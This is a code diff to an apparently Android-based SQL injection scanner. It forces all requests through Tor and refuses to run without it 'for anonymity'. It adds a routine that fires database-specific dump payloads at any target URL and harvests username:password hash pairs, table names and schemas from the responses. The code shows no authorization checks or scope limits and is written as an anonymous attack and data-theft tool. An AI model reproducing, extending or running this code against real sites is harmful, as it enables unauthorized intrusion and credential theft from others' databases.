@@ -1,42 +1,56 @@
 package com.sqliblackboxpro
 
+import android.util.Log
 import okhttp3.*
 import java.net.InetSocketAddress
 import java.net.Proxy
+import java.net.Socket
 import java.util.concurrent.TimeUnit
 
 class SQLScanner {
     
-    private val standardClient = OkHttpClient.Builder()
-        .connectTimeout(30, TimeUnit.SECONDS)
-        .readTimeout(30, TimeUnit.SECONDS)
-        .build()
+    private val TAG = "SQLScanner"
     
+    // FAIL-CLOSED: Only Tor client is available
+    // All traffic MUST go through Tor SOCKS proxy at 127.0.0.1:9050
     private val torClient = OkHttpClient.Builder()
         .connectTimeout(30, TimeUnit.SECONDS)
         .readTimeout(30, TimeUnit.SECONDS)
         .proxy(Proxy(Proxy.Type.SOCKS, InetSocketAddress("127.0.0.1", 9050)))
         .build()
     
-    private val stealthUserAgents = listOf(
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
-    )
-    
-    suspend fun scanURL(url: String, mode: ScanMode): ScanResult {
-        val client = when (mode) {
-            ScanMode.STANDARD -> standardClient
-            ScanMode.TOR -> torClient
-            ScanMode.STEALTH -> createStealthClient()
+    /**
+     * Verify Tor is running before allowing scan
+     * Fail-closed security: Refuse to run if Tor is not active
+     */
+    private suspend fun verifyTorConnection(): Boolean {
+        return try {
+            Socket("127.0.0.1", 9050).use { socket ->
+                val isConnected = socket.isConnected
+                Log.d(TAG, "Tor verification: ${if (isConnected) "ACTIVE" else "INACTIVE"}")
+                isConnected
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Tor verification FAILED: ${e.message}")
+            false
         }
+    }
+    
+    suspend fun scanURL(url: String): ScanResult {
+        // FAIL-CLOSED ENFORCEMENT: Verify Tor is running
+        if (!verifyTorConnection()) {
+            throw SecurityException("FAIL-CLOSED: Tor is not running. Cannot proceed without Tor for anonymity.")
+        }
+        
+        // Only Tor client is used - fail-closed architecture
+        val client = torClient
         
         var vulnerabilityFound = false
         var detectedDatabase = DatabaseType.UNKNOWN
         var successfulPayload = ""
         var responseDetails = ""
         val extractedData = mutableListOf<String>()
+        var databaseDump: DatabaseDump? = null
         
         // Test detection payloads first
         for (payload in SQLPayloads.DETECTION_PAYLOADS) {
@@ -44,11 +58,6 @@ class SQLScanner {
                 val testUrl = buildTestUrl(url, payload)
                 val request = Request.Builder()
                     .url(testUrl)
-                    .apply {
-                        if (mode == ScanMode.STEALTH) {
-                            header("User-Agent", stealthUserAgents.random())
-                        }
-                    }
                     .build()
                 
                 val response = client.newCall(request).execute()
@@ -68,10 +77,12 @@ class SQLScanner {
             }
         }
         
-        // If vulnerability found, try to extract data
+        // If vulnerability found, try to extract data AND perform database dump
         if (vulnerabilityFound) {
             val extractionPayloads = when (detectedDatabase) {
                 DatabaseType.MYSQL -> SQLPayloads.DATA_EXTRACTION_PAYLOADS
+                DatabaseType.POSTGRESQL -> SQLPayloads.POSTGRESQL_EXTRACTION_PAYLOADS
+                DatabaseType.MSSQL -> SQLPayloads.MSSQL_EXTRACTION_PAYLOADS
                 else -> SQLPayloads.DATA_EXTRACTION_PAYLOADS // Default to MySQL payloads
             }
             
@@ -80,11 +91,6 @@ class SQLScanner {
                     val testUrl = buildTestUrl(url, payload)
                     val request = Request.Builder()
                         .url(testUrl)
-                        .apply {
-                            if (mode == ScanMode.STEALTH) {
-                                header("User-Agent", stealthUserAgents.random())
-                            }
-                        }
                         .build()
                     
                     val response = client.newCall(request).execute()
@@ -100,6 +106,9 @@ class SQLScanner {
                     // Continue with next payload
                 }
             }
+            
+            // Perform comprehensive database dump
+            databaseDump = performDatabaseDump(client, url, detectedDatabase)
         }
         
         return ScanResult(
@@ -107,15 +116,110 @@ class SQLScanner {
             databaseType = detectedDatabase,
             extractedData = extractedData,
             payloadUsed = successfulPayload,
-            responseDetails = responseDetails
+            responseDetails = responseDetails,
+            databaseDump = databaseDump
         )
     }
     
-    private fun createStealthClient(): OkHttpClient {
-        return OkHttpClient.Builder()
-            .connectTimeout(30, TimeUnit.SECONDS)
-            .readTimeout(30, TimeUnit.SECONDS)
-            .build()
+    /**
+     * Perform comprehensive database dump for vulnerable targets
+     */
+    private suspend fun performDatabaseDump(
+        client: OkHttpClient,
+        url: String,
+        dbType: DatabaseType
+    ): DatabaseDump {
+        val users = mutableListOf<String>()
+        val tables = mutableListOf<String>()
+        val schemas = mutableListOf<String>()
+        val allDataBuilder = StringBuilder()
+        
+        allDataBuilder.append("=== DATABASE DUMP ===\n")
+        allDataBuilder.append("Database Type: ${dbType.name}\n")
+        allDataBuilder.append("Target URL: $url\n")
+        allDataBuilder.append("Timestamp: ${System.currentTimeMillis()}\n\n")
+        
+        // Get database-specific dump payloads
+        val dumpPayloads = when (dbType) {
+            DatabaseType.MYSQL -> SQLPayloads.MYSQL_DUMP_PAYLOADS
+            DatabaseType.POSTGRESQL -> SQLPayloads.POSTGRESQL_DUMP_PAYLOADS
+            DatabaseType.MSSQL -> SQLPayloads.MSSQL_DUMP_PAYLOADS
+            DatabaseType.ORACLE -> SQLPayloads.ORACLE_DUMP_PAYLOADS
+            else -> SQLPayloads.MYSQL_DUMP_PAYLOADS // Default
+        }
+        
+        // Execute dump payloads
+        for ((index, payload) in dumpPayloads.withIndex()) {
+            try {
+                val testUrl = buildTestUrl(url, payload)
+                val request = Request.Builder()
+                    .url(testUrl)
+                    .build()
+                
+                val response = client.newCall(request).execute()
+                val body = response.body?.string() ?: ""
+                response.close()
+                
+                if (body.isNotEmpty()) {
+                    allDataBuilder.append("--- Payload ${index + 1} Result ---\n")
+                    allDataBuilder.append("Payload: $payload\n")
+                    allDataBuilder.append("Response:\n$body\n\n")
+                    
+                    // Parse and categorize results
+                    val extractedUsers = extractUsers(body)
+                    val extractedTables = extractTables(body)
+                    val extractedSchemas = extractSchemas(body)
+                    
+                    users.addAll(extractedUsers)
+                    tables.addAll(extractedTables)
+                    schemas.addAll(extractedSchemas)
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Dump payload failed: ${e.message}")
+            }
+        }
+        
+        allDataBuilder.append("=== END DATABASE DUMP ===\n")
+        
+        return DatabaseDump(
+            users = users.distinct(),
+            tables = tables.distinct(),
+            schemas = schemas.distinct(),
+            allData = allDataBuilder.toString()
+        )
+    }
+    
+    private fun extractUsers(response: String): List<String> {
+        val users = mutableListOf<String>()
+        // Extract username:password patterns
+        val userPattern = Regex("([a-zA-Z0-9_.-]+):(\\$[^\\s,]+|[a-f0-9]{32,})")
+        userPattern.findAll(response).forEach { match ->
+            users.add("${match.groupValues[1]}:${match.groupValues[2]}")
+        }
+        // Extract simple username lists
+        val simpleUserPattern = Regex("user[^:]*:\\s*([a-zA-Z0-9_.-]+)", RegexOption.IGNORE_CASE)
+        simpleUserPattern.findAll(response).forEach { match ->
+            users.add(match.groupValues[1])
+        }
+        return users
+    }
+    
+    private fun extractTables(response: String): List<String> {
+        val tables = mutableListOf<String>()
+        val tablePattern = Regex("table[^:]*:\\s*([a-zA-Z0-9_.-]+)", RegexOption.IGNORE_CASE)
+        tablePattern.findAll(response).forEach { match ->
+            tables.add(match.groupValues[1])
+        }
+        return tables
+    }
+    
+    private fun extractSchemas(response: String): List<String> {
+        val schemas = mutableListOf<String>()
+        val schemaPattern = Regex("(schema|database)[^:]*:\\s*([a-zA-Z0-9_.-]+)", RegexOption.IGNORE_CASE)
+        schemaPattern.findAll(response).forEach { match ->
+            schemas.add(match.groupValues[2])
+        }
+        return schemas
     }
     
     private fun buildTestUrl(baseUrl: String, payload: String): String {
